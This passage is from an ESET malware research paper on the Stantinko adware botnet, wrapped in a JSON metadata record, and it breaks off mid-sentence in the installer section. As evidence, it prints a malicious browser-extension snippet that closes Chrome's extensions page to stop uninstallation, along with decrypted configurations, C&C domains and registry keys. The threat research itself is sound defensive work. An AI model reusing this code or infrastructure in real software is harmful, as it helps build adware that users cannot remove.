{
    "id": "4a75b559-a42e-4079-ac36-d06f749b3c84",
    "created_at": "2022-10-25T16:48:24.525648Z",
    "updated_at": "2025-03-27T02:16:26.11119Z",
    "deleted_at": null,
    "sha1_hash": "631b71581b957a19a35ead27217b90a6e751895b",
    "title": "",
    "authors": "",
    "file_creation_date": "2017-07-19T23:59:18Z",
    "file_modification_date": "2017-07-19T23:59:27Z",
    "file_size": 4253774,
    "plain_text": "# Stantinko\n\n#### Teddy Bear Surfing Out of Sight\n\n### Frédéric Vachon Matthieu Faou Marc-Etienne M.Léveillé\n\nJuly 2017\n\n\n-----\n\n# Stantinko\n\n#### Teddy Bear Surfing Out of Sight\n\n### Frédéric Vachon Matthieu Faou Marc-Etienne M.Léveillé\n\nJuly 2017\n\n\n-----\n\n##### TABLE OF CONTENT\n\n**1. Executive Summary** **7**\n\n**2. Overview** **8**\n\n2.1. Timeline 8\n\n2.2. Stantinko’s Early Years (2012-2015) 9\n\n2.3. Stantinko’s Ongoing Campaign (2015-present) 10\n\n**3. FileTour: The Infection Vector** **13**\n\n3.1. How It Is Distributed 13\n\n3.2. Downloader 15\n\n3.3. FileTour Payloads 16\n\n**4. Stantinko Installer** **22**\n\n4.1. Service Types 22\n\n4.2. Network Protocol 23\n\n4.3. Obfuscation 24\n\n4.4. Loader 25\n\n**5. Plugin Downloader Service (PDS)** **26**\n\n5.1. Overview 26\n\n5.2. Plugin Downloader Service Analysis 29\n\n5.3. Plugins 32\n\n**6. Browser Extension Downloader Service (BEDS)** **46**\n\n6.1. Overview 46\n\n6.2. Browser Extension Downloader Service Analysis 49\n\n6.3. Plugins 56\n\n6.4. Browser Extensions 58\n\n**7. Linux Trojan Proxy** **78**\n\n7.1. In The Wild 78\n\n7.2. Analysis 78\n\n**8. Monetization** **80**\n\n8.1. Click Fraud 80\n\n8.2. Compromised Websites 80\n\n8.3. Social Network Fraud 81\n\n8.4. Compromised Machines 82\n\n**9. Conclusion** **83**\n\n**10. Bibliography** **84**\n\n**Appendix A: IOCs** **85**\n\n**Appendix B: FileTour Click-fraud Substitution Table** **96**\n\n**Appendix C: AVZ script** **96**\n\n**Appendix D: WordPress Backdoor** **99**\n\n\n-----\n\n##### LIST OF FIGURES\n\nFigure 1. Timeline of the Stantinko services 8\n\nFigure 2. Overview of all the components of the first Stantinko campaign 9\n\nFigure 3. Prevalence of Stantinko’s first campaign per country 10\n\nFigure 4. Overview of all the components of the Stantinko’s ongoing campaign 11\n\nFigure 5. Prevalence of Stantinko’s ongoing campaign per country 12\n\nFigure 6. Number of users of Teddy Protection 12\n\nFigure 7. Number of users of The Safe Surfing 12\n\nFigure 8. Microsoft-free homepage 13\n\nFigure 9. Certificate used to sign a FileTour sample 14\n\nFigure 10. _FileTour progress bar_ 14\n\nFigure 11. Windows task bar after the installation of FileTour _14_\n\nFigure 12. _FileTour configuration example_ 15\n\nFigure 13. List of files to download 16\n\nFigure 14. Overview of the components related to FileTour _16_\n\nFigure 15. Task created by the malware to launch the click-fraud task 17\n\nFigure 16. Click-fraud process 18\n\nFigure 17. Stats for the bit.ly link 18\n\nFigure 18. Code responsible for blocking access to the chrome extension administration 19\n\nFigure 19. Adstantinko class 20\n\nFigure 20. Encrypted packets format 20\n\nFigure 21. Decrypted content of the ps parameter 21\n\nFigure 22. Decrypted content of the ps parameter 21\n\nFigure 23. Overview of Stantinko Installer 22\n\nFigure 24. Second POST request to update.ultimate-discounter[.]com 23\n\nFigure 25. Client request protocol 23\n\nFigure 26. Server reply protocol 24\n\nFigure 27. Hex-Rays output of string building in ghstore.exe 24\n\nFigure 28. Comparison of an unobfuscated and an obfuscated function 25\n\nFigure 29. Overview of the Plugin Downloader Service _27_\n\nFigure 30. Strings from the AFNI project found in wbiosrvp.dll 29\n\nFigure 31. Hex-Rays output of the substitution algorithm used to decrypt fdclient.dll 30\n\nFigure 32. Decrypted report format 31\n\nFigure 33. Server reply format 32\n\nFigure 34. Prevalence of the different PDS modules 33\n\nFigure 35. POST request to send the volume serial number 33\n\nFigure 36. List of compromised websites used as command and control servers\nfor the search parser module (April, 3rd 2017) 34\n\nFigure 37. Number of commits on the GitHub account for the file named index 35\n\nFigure 38. POST request data 35\n\nFigure 39. JSON search task 36\n\n\n-----\n\nFigure 40. Conditions for request validation 37\n\nFigure 41. Script used to build the search tasks 38\n\nFigure 42. Search results - data2.dat file 38\n\nFigure 43. Websites used to generate legitimate traffic 39\n\nFigure 44. Decrypted request 40\n\nFigure 45. Decrypted response (partial) 40\n\nFigure 46. Decrypted report 41\n\nFigure 47. Supported e-mail providers 42\n\nFigure 48. Anti-captcha.com homepage 43\n\nFigure 49. Load of anti-captcha.com on 24/03/2017 44\n\nFigure 50. Overview of the Browser Extension Downloader Service 47\n\nFigure 51. Hex-Rays output of installed services check 48\n\nFigure 52. Hex-Rays output of the shellcode decryption routine 50\n\nFigure 53. Function before and after code injection 50\n\nFigure 54. First part of the shellcode 51\n\nFigure 55. `Robothemes[.]net Homepage` 52\n\nFigure 56. Second Request 52\n\nFigure 57. Notify report format 53\n\nFigure 58. Download report format 54\n\nFigure 59. Base64-decoded reply 54\n\nFigure 60. Reply format for a NOTIFY report 54\n\nFigure 61. JSON format 55\n\nFigure 62. Download response format 55\n\nFigure 63. View of the sections of the BEDS in IDA 56\n\nFigure 64. End of the embedded dropper 56\n\nFigure 65. Browsers targeted by KBDMAI_ExtInstaller.dll 57\n\nFigure 66. clearcache.bat 57\n\nFigure 67. Files opened by clearcache 58\n\nFigure 68. APIHelper background script 59\n\nFigure 69. APIHelper content script 60\n\nFigure 70. Get request to apihelper[.]org 61\n\nFigure 71. Decrypted cparam 61\n\nFigure 72. APIHelper configuration sample 63\n\nFigure 73. Script injected in Mail.Ru pages 64\n\nFigure 74. Script injected in VKontakte pages 64\n\nFigure 75. Brenev/collection github repository 65\n\nFigure 76. The Safe Surfing on the Chrome Web Store 66\n\nFigure 77. Bad comment for The Safe Surfing on the Chrome Web Store 66\n\nFigure 78. Translation of the comment 66\n\nFigure 79. Decrypted blacklist.php response 67\n\nFigure 80. POST request to get the blacklist 68\n\nFigure 81. Decoded data field 68\n\n\n-----\n\nFigure 82. The Safe Surfing malicious configuration 69\n\nFigure 83. Callback on the event onNavigateListener 70\n\nFigure 84. Injection of ads on the rambler.ru website 70\n\nFigure 85. Redirection on click 71\n\nFigure 86. Redirection process 72\n\nFigure 87. Teddy Protection extension on the Chrome Web Store 73\n\nFigure 88. Teddy Protection administrative page 73\n\nFigure 89. Request for a blacklist update 74\n\nFigure 90. Decompressed reply 74\n\nFigure 91. Request for an AList 74\n\nFigure 92. Decompressed reply 76\n\nFigure 93. Domain conversion algorithm 77\n\nFigure 94. Report sent to the C&C server 78\n\nFigure 95. Cost of buying Facebook likes 81\n\nFigure 96. List of extensions that can be installed 94\n\nFigure 97. Browser files modified by KBDMAI_ExtInstaller 95\n\nFigure 98. AVZ script to remove Zaxar 98\n\nFigure 99. WordPress backdoor plugin 99\n\n##### LIST OF TABLES\n\nTable 1. First service variants 22\n\nTable 2. Plugin Downloader Service variants 28\n\nTable 3. Mimicked software 28\n\nTable 4. Command and control servers per service type 31\n\nTable 5. Statistics on the number of searches done per hour 39\n\nTable 6. List of actions of the Facebook bot 43\n\nTable 7. List of commands implemented in the remote control plugin 44\n\nTable 8 Service types 48\n\nTable 9. Mimicked software 49\n\nTable 10. Command and control servers per service type 51\n\nTable 11. Stantinko’s C&C servers 88\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n##### 1. EXECUTIVE SUMMARY\n\nAdware isn’t usually the sexiest type of malware to analyze. When we took our first look at Stantinko,\nwe had no idea whether we were looking at adware or spyware. It took some time before we could\nunderstand Stantinko’s purpose because of the way it stays persistent while not leaving too much\ninformation on the compromised machine. To get a global view of the Stantinko ecosystem,\nyou need a lot of the pieces of the puzzle. The more we dug and tracked Stantinko, the more\nwe could collect those pieces and put them together.\n\nThe scale of the botnet also caught our attention. With a victim population of hundreds\nof thousands, Stantinko is one of the most prevalent threats in Russia.\n\nHere are some of the key findings from our research:\n\n- Installation statistics show that about half a million computers are compromised\nwith Stantinko.\n\n- This threat targets mainly Russia (46%) and Ukraine (33%).\n\n- The botnet is monetized by installing browser extensions that inject ads while surfing\nthe web.\n\n- Components that are left on disk employ a custom code obfuscator that mangles strings\nand applies control flow flattening.\n\n- In most of the Stantinko components, the malicious code is concealed inside legitimate\nfree and open source software that has been modified and recompiled.\n\n- Stantinko installs multiple persistent services that install one another to resist cleaning\nattempts.\n\n- Although its most common use is to install adware, Stantinko can actually download\nand execute anything. We saw additional modules being deployed on subsets of the botnet\nsuch as a fully-featured remote administration backdoor, a bot performing searches\non Google and a tool that brute-forces Joomla and WordPress administrative login pages.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n##### 2. OVERVIEW\n\nWhen we first started looking at Stantinko, we only had a few samples that, by themselves, didn’t\nlook malicious. For example, one of the Stantinko’s DLL only “malicious” activity is to load a DLL file\nfrom a path saved in the Windows registry, decrypt it and call the GetInterface export. Without\nall three of the following: (a) knowing the path to the file, (b) the other DLL, and (c) the decryption\nkey from the Windows Registry, it looks pretty benign.\n\nAnother trick used to avoid detection is to hide the malicious code in the Windows Registry.\nAgain, the file itself looks legitimate if you do not have access to the content of that Registry key.\n\nCommunication with the C&C servers is also encrypted and domain names are based on the\ncomponent name: for example, wsaudio[.]com for wsaudio.dll.\n\nWe used a mixture of internal telemetry and custom fake bots to track both what Stantinko\nwas being used for, and how it came to end up on so many systems.\n\nIn this paper, we trace connections between multiple malware families: FileTour, Adstantinko\nand Stantinko. This section will give an overview of the two main campaigns by this group\nthat we have observed in the last five years.\n\n###### 2.1. Timeline\n\nWe have traced Stantinko botnet activity since 2012. Over these five years, the authors have\ndeveloped a large toolset that increased in sophistication. Moreover, they are still really active\nas they released new versions of their main services in March, 2017. Figure 1 provides a timeline\nof the filenames used by the Stantinko components. This timeline is based on the registration date\nof the C&C domains and the compilation timestamp of the binaries, which seem to correlate.\n\n\n##### 2012\n**November**\n```\nir16_32.dll\n\n##### 2017\n```\n**January**\n```\nudservice.exe\n\n##### 2017\n```\n**March**\n```\nbstreamsvc.dll\nvp9core.dll\noptsatadc.dll\n\n```\n\n##### 2012\n**December**\n\n\n##### 2014\n**July**\n\n\n##### 2014\n**December**\n\n\nFigure 1. Timeline of the Stantinko services\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nThe first campaign includes the components listed above from ir16_32.dll to wlanmgr.dll while\nthe second includes the components from wsaudio.dll onward.\n\n###### 2.2. Stantinko’s Early Years (2012-2015)\n\nThe first campaign ran for about three years and the overall architecture of its components\nconsists of two main services and an installer. The installer was often called GoogleUpdate.exe,\n```\nOperaUpdate.exe, or AmigoUpdate.exe. Figure 2 provides an overview of the components \n\n```\nof that campaign.\n```\n                        {Opera, Chrome, Amigo}Update.exe\n\n```\nDrops & installs\n```\n                             d3dadapter.dll\n                               KBDMAI.dll\n\n```\nCan reinstall\n```\n                              wlanmgr.dll\n\n```\nDrops & installs\n```\n                              ir16_32.dll\n\n```\nFigure 2. Overview of all the components of the first Stantinko campaign\n\nIn the course of our investigation, we noticed that three domain names used by Stantinko\nwere expired and available for registration. The components using these domain names are not\ndistributed anymore but some victims could still be running the old variants. We decided to set up\na sinkhole server to gather data on the prevalence of the threat. We collected data for three months\nfrom the beginning of March 2017 to the end of May 2017. The domains we sinkholed are kbdmai[.]net,\n```\nmserrep[.]org and wupdateservice[.]us. These domains were used by d3dadapter.dll\n\n```\nand KBDMAI.dll. We received requests from 140,000 unique IP addresses on our sinkhole with\nHTTP headers matching Stantinko’s check-in format. Although there is IP address churn, this large\nquantity seems particularly high for malware that has not been distributed for the last two years.\nThe geolocation of each of those IP addresses shows which countries are mainly targeted\nby Stantinko. It is clear from the statistics that the countries mainly targeted are Russia,\nUkraine, Belarus and Kazakhstan.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n### 14%\n\nUkraine\n\n## 60%\n\nRussian Federation\n\n#### 12%\n\nBelarus\n\n##### 9%\n\nKazakhstan\n\n###### 5%\n\nOther\n\nFigure 3. Prevalence of Stantinko’s first campaign per country\n\n###### 2.3. Stantinko’s Ongoing Campaign (2015-present)\n\nAn overview of all the components of the current campaign is shown in Figure 4. It includes\nthe malware used since early 2015.\n\nThe initial infection vector is FileTour, which is distributed in executable format disguised as a torrent\nfile. It is a downloader that installs multiple Potentially Unwanted Applications (PUAs) and Adstantinko.\n_FileTour will be described in detail in Section 3._\n\n_Adstantinko is the installer of the Stantinko family and will be described in Section 4. In this family,_\nthere are two main services: what we call the Plugin Downloader Service (abbreviated PDS) described\nin Section 5 and the Browser Extension Downloader Service (abbreviated BEDS) described in Section 6.\nThey both can reinstall each other and manage additional modules that perform the actual\nmalicious behavior.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nFileTour\n\n\nMail.ru\n\n|Tour|Col2|\n|---|---|\n|Tour||\n|||\n|||\n\n|Down & r|loads uns|\n|---|---|\n\n\nFigure 4. Overview of all the components of the Stantinko’s ongoing campaign\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nESET’s telemetry data for April 2017 showed that the same countries are targeted that were seen\nin the sinkhole. The vast majority of Stantinko’s targets reside in Russia or Ukraine.\n\n#### 8%\n 33% Kazakhstan\n\nUkraine\n\n#### 8%\n 46% Belarus\n\nRussia\n\n#### 5%\n\nRepublic of Moldova,\nKyrgystan, Uzbekistan,\nAzerbaijan & Armenia\n\nFigure 5. Prevalence of Stantinko’s ongoing campaign per country\n\nThe purpose of one of Stantinko’s persistent services is to install malicious browser extensions.\nThose extensions can perform advertising fraud. Even if they seem legitimate from the outside\nand seem to perform the tasks for which they are intended, we believe most of the installations\nwere achieved without user consent. Thus, the number of installations provided by Google\nmay give a rough idea of how prevalent Stantinko really is.\n\nThe two browser extensions that we’ve seen installed by Stantinko are The Safe Surfing and Teddy\n_Protection. At time of writing, both extensions have around 500,000 users._\n\nFigure 6. Number of users of Teddy Protection\n\nFigure 7. Number of users of The Safe Surfing\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n##### 3. FILETOUR: THE INFECTION VECTOR\n\n_FileTour is a malware family that covers different Russian Pay-Per-Install platforms such as MoneyInst_\nand InstallRed. Not only is it the gateway to Stantinko; it is also used to distribute other malware\nand Potentially Unwanted Applications.\n\n###### 3.1. How It Is Distributed\n\nBy looking at some machines compromised with Stantinko, we realized they were all infected\nby another malicious program, detected by ESET as Win32/FileTour. We were then able to find\nsome websites distributing this malware family.\n\nThe websites we identified offer pirated software such as Microsoft Office or games such\nas Grand Theft Auto V. Figure 8 is a screenshot of the microsoft-free[.]com website that offers,\nas the name suggests, “free” (ahem – read stolen) Microsoft software.\n\nFigure 8. Microsoft-free homepage\n\nAll the websites we identified use the same network infrastructure. A click on the download link\nredirects to a page that displays a progress bar. In the background, a file is downloaded from Yandex\nDisk, a cloud-based file hosting service. We noticed that once the file is downloaded, the links\nare broken. The hash of the file also changes for every download. Thus, we believe that the files\nare generated, uploaded to Yandex Disk and deleted each time a user requests a download.\n\nThe downloaded files have similar characteristics:\n\n1. They are signed with valid certificates as shown in Figure 9.\n\n2. They have similar information in the description tab:\n\na. `Product name: PackageForTheWeb Stub.`\n\nb. `Product version: 2.02.001.`\n\n3. They are packed with VMProtect 2 and embed components packed with PeCancer, ZProtect\nand PELock.\n\n4. They show a similar progress bar during the installation, as shown in Figure 10.\n\n5. They install everything except the advertised software. Figure 11 is a screenshot of the Windows\ntask bar after the installation of the malware. Four icons have been added.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nFigure 9. Certificate used to sign a FileTour sample\n\nFigure 10. _FileTour progress bar_\n\nFigure 11. Windows task bar after the installation of FileTour\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n###### 3.2. Downloader\n\nIn this section, we will describe the FileTour malware itself. Basically, it is a downloader that is highly\npacked and obfuscated. Once launched, it will contact a particular domain, download a list of URLs,\ndownload the corresponding files and finally install all the components. A detailed description\nof each installed program is provided in the next section.\n\nEach sample embeds a configuration file (config) in the JSON format. It is encrypted but it can\nbe dumped, decrypted, at runtime. We provide an example of such a config in Figure 12.\n```\n        {\n          “random_pass”: “DFORACnJS4055Wco”,\n          “mg_amiga_count”: 0,\n          “rfr”: “openpart1”,\n          “dmn”: “horses.angelalert.gdn”, ➊\n          “knock_url”: “hxxp://ec2-54-246-179-93.eu-west-1.compute.\n        amazonaws.com/api/knock/Gr29hdpeTRYuR1EmhNNaFA”, ➋\n          “country”: “ru”,\n          “wm”: 188,\n          “site_id”: 463,\n          “lm_proc_sng_count”: 0,\n          “filename”: “Word 2016.exe”, ➌\n          “24dns_count”: 2854,\n          “lm_amiga_count”: 0,\n          “knock2_url”: “hxxp://ec2-54-246-179-93.eu-west-1.compute.\n        amazonaws.com/api/knock2/Gr29hdpeTRYuR1EmhNNaFA”, ➍\n          “mg_search_count”: 0,\n          “filesize”: 0,\n          “bin_dmn”: “carveexchange.gdn”, ➊\n          “random_pass_hash”: “2d25ff8d563ed513332585626b56c4c7”,\n          “dnl_url”: “hxxp://yadi.sk/d/d5MSiYiTrdWGD”, ➎\n          “lg_id”: 164324973,\n          “mg_proc_sng_count”: 55,\n          “utility_domain”: “hxxp://koskinen.ru/” ➏\n        }\n\n```\n➊ These domains were not used during the execution of the malware\nand we were not able to find any communication with these domains.\n\n➋ The program first contacts this domain. The reply is always “ok”.\nWe believe it is simply used for analytics.\n\n➌ The filename of the FileTour sample.\n\n➍ This is a fallback for the previous knock domain.\n\n➎ The Yandex Disk URL where the malware was downloaded.\n\n➏ It downloads a list of files to download using this domain and by appending\n```\n       /image.png. The reply data is encrypted by simply adding one at each\n\n```\nbyte. We provide an example in Figure 13.\n\nFigure 12. _FileTour configuration example_\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n➊ Amigo browser installer\n\n➋ Mail.Ru/Sputnik installer\n\n➌ Click-fraud malware (detected as Win32/Packed.VMProtect\n```\n       .ABU trojan)\n\n```\n➍ _Adstantinko (detected as Win32/Extenbro.DE)_\n\nFigure 13. List of files to download\n\nThe files to download are not actually video files. They are windows executables encrypted using\n[a custom algorithm. We provide a Python script to decrypt these files on our GitHub repository.](https://github.com/eset/malware-research/tree/master/stantinko)\nWe detail the downloaded files in the next section.\n\n###### 3.3. FileTour Payloads\n\nThe FileTour malware family, generally disguised as pirated software, is a downloader for other\nmalware and PUAs. In the campaign we studied, it installs Mail.Ru/Sputnik, the Amigo browser,\nclick-fraud malware and an additional downloader, detected as Win32/Extenbro.DE. This section\ndetails each program installed by FileTour. We also provide in Figure 14 a graph that summarizes\nthe relationships between the FileTour components.\n\nFileTour Mail.ru\n\nAmigo Zaxar installer\n\nClick fraud Browser extension installer\n\nAdstantinko `udsetup.exe`\n\nFigure 14. Overview of the components related to FileTour\n\n###### 3.3.1. Mail.Ru/Sputnik\n\nThis component is downloaded as the file 20_search_top.avi. Once decrypted, this is the\nwindows installer for Mail.Ru/Sputnik. It is signed with a valid certificate issued to “LLC Mail.Ru”.\n\n|Tour|Col2|\n|---|---|\n|Tour||\n|||\n|||\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nMail.Ru is a popular Russian company that operates several online services such as an email\nservice, a search engine and a social network. The Mail.Ru installer is a program that will replace\nthe homepage of the browsers for Mail.Ru and add several browser extensions. While it is not\nmalicious in and off itself, it can degrade the user experience.\n\nAn affiliate program for distributing this program is advertised on the Sputnik website\n[(http://sputnik.mail.ru). Thus, we believe that FileTour’s operators earn money by installing](http://sputnik.mail.ru/)\nthe Mail.Ru/Sputnik package.\n\n###### 3.3.2. Amigo Loader\n\nThis component is downloaded as the 9183_Hello_Amigo_track.avi file. Once decrypted,\nthis is the Windows installer for the Amigo browser, another Mail.Ru program. It is also signed\nwith a valid certificate that was also issued to “LLC Mail.Ru”.\n\nAdditional applications are installed with the Amigo browser, such as one to connect to the VKontakte\nsocial network. Like Mail.Ru, Amigo runs an affiliate program. That would explain why FileTour’s\noperators are installing this program.\n\n###### 3.3.3. Click-fraud Trojan (Win32/Packed.VMProtect.ABU trojan)\n\nThis component is downloaded as the all_films_4922.avi file. Once decrypted, this is a Windows\nexecutable written in Delphi and packed with VMProtect 2 (SHA-1 is A5C3076F4E38A9E497F1205\n```\n58DB669FDD139E702).\n\n```\nIn the list provided in Figure 13, there were three other files in the list that were actually not downloaded: md_Films-174131.avi, s4y_Films-174132.avi and s4m_\n```\n         Films-174133.avi. They all are similar to all_films_4922.avi. They use the same C&C\n\n```\nand perform the same actions.\n\nThe purpose of this malware is really simple: it schedules a task to open a given website at regular\nintervals with Internet Explorer. This website is a doorway to a redirection chain, finally landing\non websites that, for instance, promote casinos.\n\nFirst, the malware contacts its C&C, hxxp://ec2-35-157-42-121.eu-central-1.compute.\n```\namazonaws.com. The reply contains the URL that should be opened with Internet Explorer. \n\n```\nIt is base64-encoded and encrypted using a custom algorithm. We provide the URLs we identified\nin Appendix A along with the table used to decrypt the links in Appendix B.\n\nSecondly, it adds a task in the Windows Task Scheduler that will launch Internet Explorer every\n34 minutes to open the URL sent by the C&C. Figure 15 is a screenshot of the Task Scheduler\nof a computer infected with this malware.\n\nFigure 15. Task created by the malware to launch the click-fraud task\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nEvery 34 minutes, the Internet Explorer window goes from the doorway website to the landing page\nthrough a redirection chain, a technique extensively used in click fraud. The intermediate websites\nare generally ad networks or ad exchanges that earn money by buying and reselling ads in real time.\nA summary of the process is provided in Figure 16.\n\n**Redirects**\n\n**Redirects** **Redirects**\n\nAd networks\n& Ad exchanges\n\nDoorway search engine Landing page\n\nPublisher Advertiser\n\n\nFigure 16. Click-fraud process\n\nThe doorway page is typically a fake search engine, as is the case for other click-fraud malware [1].\nIf the user browses to the index page, the search engine is displayed. However, if a special URL\nis entered, the user is redirected through a redirection chain to an advertiser website as a landing page.\n\nInterestingly, one of the initial URLs, hxxp://newsonlineonly.net/xoussm, first redirects\nto a Bitly URL. Bitly link statistics are available publicly. Figure 17 is the data for this shortened URL.\nThis shows that from the middle of March to the middle of April 2017, there were more than 15 million\nviews of this page. Even though these views may not all have been initiated by this malware, it indicates\nthat the URL get massive volumes of visits and is probably able to generate a considerable amount\nof revenue.\n\nFigure 17. Stats for the bit.ly link\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nFinally, the URLs used by this malware are regularly changed so that the total amount of traffic\nis probably far higher than what is shown here. For instance, we identified a second Bitly redirection\nthat had also more than 15 million views in a single month.\n\n###### 3.3.4. Zaxar Installer\n\nZaxar is a media company registered in Cyprus. One of its products is the Zaxar Game Browser.\nThe company says this is a browser that is designed to play online games easily. However, a quick\nsearch on the Internet shows that it is causing more problems than it is helping to solve. Several\nusers are complaining about pop-up ads that appeared after they installed the Zaxar Game Browser.\n\nIn a later section (Section 5.3.7), we will describe a Stantinko module that is designed\nto uninstall the Zaxar Game Browser from the computer using the Kaspersky Antiviral\nToolkit (AVZ). Zaxar and Stantinko are probably competitors that are installed\nby the same Pay-Per-Install platform.\n\n###### 3.3.5. Win32/Extenbro.C\n\nThis component is a browser extension installer for Chrome, Opera, Yandex Browser and Amigo.\nDue to the number of extensions and the lack of similarities between them, we believe it is a form\nof Pay-Per-Install for browser extensions. We provide a non-exhaustive list in Appendix A.4.\n\nMost of them are not to be found on the Chrome Web Store. They might have been removed by Google\nalready or perhaps they were never added to the store. The majority of them do not seem malicious\nbut the way they are distributed is clearly not the right way in which to distribute extensions.\nSome of them, like Tamper Monkey, have a large number of users, suggesting that many\ndifferent developers, including legitimate ones, use this Pay-Per-Install platform.\n\nAn interesting extension included in the list is the last one, called Spitus. It is designed to block\naccess to the Chrome extension administration tab. The snippet of code responsible for this is shown\nin Figure 18.\n\n```\nwindow[“onUpdatedListener”] = function(tabId, changeInfo, tab) {\n  if (typeof(tab.url) != ‘undefined’ && changeInfo.status ==\n‘complete’) {\n    if (tab.url.indexOf(‘chrome’ + ‘://ext’ + ‘ensions’) != -1\n|| (tab.url.indexOf(window.chrome.runtime.id) != -1 && tab.url.\nindexOf(‘ad’+’min/ins’+’talls’) == -1)) {\n      chrome[“tabs”][“remove”](tab.id);\n    }\n  }\n};\n\n```\n\nFigure 18. Code responsible for blocking access to the chrome extension administration\n\nThis plugin is clearly malicious as there is no reason to stop users accessing this tab, except to block\nusers from uninstalling the freshly installed extensions.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n###### Adstantinko - Win32/Extenbro.DE\n\nThis is the component that really interests us for the next part of our investigation. Based on a class\nfound in the binary, as shown in Figure 19, we believe it is called Adstantinko by the operators. However,\nit is not to be confused with our Win32/Adstantinko detection, which will be explained later.\n\nFigure 19. Adstantinko class\n\nWe were only able to trigger the following chain of events from a Russian IP address. We have tried\nto compromise machines with IP addresses outside of Russia, but none of the behavior described\nhere was observed.\n```\nWin32/Extenbro.DE uses a custom cryptographic algorithm to encrypt network communications.\n\n```\nThe format of the packet is shown in Figure 20.\n\n**0** **2** **7**\n\nMagic Header Encoded Tick Count Data\n\n➊ ➋ ➌\n\n➊ The magic header is KK\n\n➋ Encoded tick count from which the key is derived\n\n➌ The encrypted data\n\nFigure 20. Encrypted packets format\n\nOnce the key is derived from the encoded tick count, it is hashed using the MD5 algorithm and this hash\nis used as a key to decrypt the data using RC4. We won’t describe the key derivation process, but we have\n[provided a script to decrypt these packets in our GitHub repository.](https://github.com/eset/malware-research/tree/master/stantinko)\n```\nWin32/Extenbro.DE first sends a POST request to hxxp://clients3.ultimate-discounter.\ncom/target/index.php?php=ping. Its body has 2 parameters: ps and php. That’s where we see\n\n```\nthe first appearance of the group field that will be used by all Stantinko’s services. The response\ncontains a batch file that will store the group value in the Windows Registry for later use.\n\nThe ps parameter contained in the request and the server response are encrypted using the same\nalgorithm we just described.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n```\n{\n “tkn”: “1fa1d9a6e3b1d3cf3ed86a401c2a0806”,\n “group”: “1000_59607934”,\n “avs”: “”\n}\n\n```\n\nFigure 21. Decrypted content of the ps parameter\n\nA second request follows. This is a POST request to hxxp://clients3.ultimate-discounter.com/\n```\ntarget/index.php?php=yasetup. The body of the request is the same as the previous one. \n\n```\nThe response contains the actual Win32/Adstantinko malware. Its legitimate functionality\nis to install “Ultimate Discounter”, a browser extension that displays discount offers on some specific\nwebsites. However, it may also install Stantinko’s first malicious service. This is done by covertly\nsending a POST request to hxxp://clients3.ultimate-discounter.com/target/index.php\ncontaining an encrypted ps parameter.\n\n```\n{\n  “key”: “3faf033cf35c4290ac2a4c6b2989f282”,\n  “token”: “cf052a4c02a12fa9d707f9557a91b4fb”,\n  “vm”:1,\n  “vb”:0,\n  “group”: “1000_73987790”\n}\n\n```\n\nFigure 22. Decrypted content of the ps parameter\n```\nWin32/Adstantinko checks for the presence of a Virtual Machine and reports whether one is found\n\n```\nin this request. That’s the purpose of the vm field. The response to this request is either an HTTP 404\nor Stantinko’s first service dropper. We weren’t able to find the exact conditions under which the dropper\nis sent. Whether the response is a HTTP 404 or the dropper, the bot ID and the group ID that will\nbe used by Win32/Stantinko are in place.\n\n- `HKCU\\Software\\Ultimate-Discounter\\udid`\n\n- `HKLM\\System\\CurrentControlSet\\Services\\Coupons Browser Update Service\\`\n```\n Parameters\\group\n\n```\nThe first service dropper will use the group value as is and the MD5 of the udid value will be used\nas the bot ID on the infected machine.\n```\nWin32/Adstantinko is obfuscated using a custom tool that is used on pretty much \n\n```\nall of the components that land on the disk. The obfuscation will be described in Section 4.3.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n##### 4. STANTINKO INSTALLER\n\nAt this point in the infection chain, the victim machine is about to be infected by components\nwe detect as Win32/TrojanDownloader.Stantinko. In this part of the paper, we’ll focus on what\nStantinko’s operators call, according to the binary PDB path, the “first service”. As explained in the last\nsection, this service is dropped via an executable downloaded by Win32/Adware.Adstantinko.\nThe only purpose of this component is to install the first malicious persistent component.\n\nFileTour Mail.ru\n\nAmigo Zaxar installer\n\nClick fraud Browser extension installer\n\nAdstantinko `udsetup.exe`\n\nDownloads\n& runs\n```\n     wsaudio_setup.dll udservice.exe\n\n```\n`wbiosrvp_setup.dll` Downloads `ghstore.exe` `first_service_setup.dll`\n\n& runs\n```\n    bstreamsvc_setup.dll bhctrl32.exe\n\n```\nInstalls\n\nFigure 23. Overview of Stantinko Installer\n\n###### 4.1. Service Types\n\nStantinko’s authors use many different services to achieve the same goals. To avoid detection,\nthey seem to create new variants once in a while without making a lot of modifications to the code\nexcept for changes in the Windows Registry keys they use, the service name, the file name, and so on.\nBut the purpose remains exactly the same. We’ve encountered three different services that were used\nto install the Plugin Downloader Service. Here’s the list of these services sorted by how recent they are.\n\n|Tour|Col2|\n|---|---|\n|Tour||\n|||\n|||\n\n|Down & r|loads uns|\n|---|---|\n\n\nTable 1. First service variants\n\n\nFilename Service name C&C First seen\n\nudservice.exe Coupons Browser Update Service update.ultimate-discounter[.]com 2017-01\n\nghstore.exe Ghostery Storage Server ghosterystore[.]com 2016-04\n\nbhctrl32.exe Bonjoiur Host Controller nvccupdate[.]com 2014-07\n\n[As its name suggests, this component is installed as a Windows service. The service stays installed until](https://msdn.microsoft.com/en-us/library/windows/desktop/ms685141(v=vs.85).aspx)\nthe Plugin Downloader Service dropper is executed. It sends a request every few hours to its command\nand control server until it receives the next service dropper. This usually happens on the same day.\nIt is 